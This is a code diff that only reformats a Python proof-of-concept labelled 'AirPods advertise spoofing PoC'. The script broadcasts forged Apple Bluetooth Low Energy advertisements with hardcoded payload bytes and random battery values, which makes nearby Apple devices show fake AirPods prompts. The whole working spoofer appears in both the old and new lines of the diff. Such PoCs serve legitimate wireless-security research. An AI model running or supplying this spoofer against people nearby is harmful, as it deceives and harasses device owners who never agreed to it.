@@ -10,26 +10,53 @@ import hashlib
 import argparse
 from time import sleep
 import bluetooth._bluetooth as bluez
-from utils.bluetooth_utils import (toggle_device, start_le_advertising, stop_le_advertising)
+from utils.bluetooth_utils import (
+    toggle_device,
+    start_le_advertising,
+    stop_le_advertising,
+)
 
-help_desc = '''
+help_desc = """
 AirPods advertise spoofing PoC
 ---chipik
-'''
+"""
 
-parser = argparse.ArgumentParser(description=help_desc, formatter_class=argparse.RawTextHelpFormatter)
-parser.add_argument('-i', '--interval', default=200, type=int, help='Advertising interval')
-parser.add_argument('-r', '--random', action='store_true', help='Send random charge values')
+parser = argparse.ArgumentParser(
+    description=help_desc, formatter_class=argparse.RawTextHelpFormatter
+)
+parser.add_argument(
+    "-i", "--interval", default=200, type=int, help="Advertising interval"
+)
+parser.add_argument(
+    "-r", "--random", action="store_true", help="Send random charge values"
+)
 args = parser.parse_args()
 
 dev_id = 0  # the bluetooth device is hci0
 toggle_device(dev_id, True)
 
-data1 = (0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x01, 0x02, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45)
+data1 = (
+    0x1E,
+    0xFF,
+    0x4C,
+    0x00,
+    0x07,
+    0x19,
+    0x01,
+    0x02,
+    0x20,
+    0x75,
+    0xAA,
+    0x30,
+    0x01,
+    0x00,
+    0x00,
+    0x45,
+)
 left_speaker = (random.randint(1, 100),)
 right_speaker = (random.randint(1, 100),)
 case = (random.randint(128, 228),)
-data2 = (0xda, 0x29, 0x58, 0xab, 0x8d, 0x29, 0x40, 0x3d, 0x5c, 0x1b, 0x93, 0x3a)
+data2 = (0xDA, 0x29, 0x58, 0xAB, 0x8D, 0x29, 0x40, 0x3D, 0x5C, 0x1B, 0x93, 0x3A)
 
 try:
     sock = bluez.hci_open_dev(dev_id)
@@ -48,14 +75,24 @@ if args.random:
         left_speaker = (random.randint(1, 100),)
         right_speaker = (random.randint(1, 100),)
         case = (random.randint(128, 228),)
-        start_le_advertising(sock, adv_type=0x03, min_interval=args.interval, max_interval=args.interval,
-                             data=(data1 + left_speaker + right_speaker + case + data2))
+        start_le_advertising(
+            sock,
+            adv_type=0x03,
+            min_interval=args.interval,
+            max_interval=args.interval,
+            data=(data1 + left_speaker + right_speaker + case + data2),
+        )
         sleep(2)
         stop_le_advertising(sock)
 else:
     try:
-        start_le_advertising(sock, adv_type=0x03, min_interval=args.interval, max_interval=args.interval,
-                             data=(data1 + left_speaker + right_speaker + case + data2))
+        start_le_advertising(
+            sock,
+            adv_type=0x03,
+            min_interval=args.interval,
+            max_interval=args.interval,
+            data=(data1 + left_speaker + right_speaker + case + data2),
+        )
         while True:
             sleep(2)
     except:
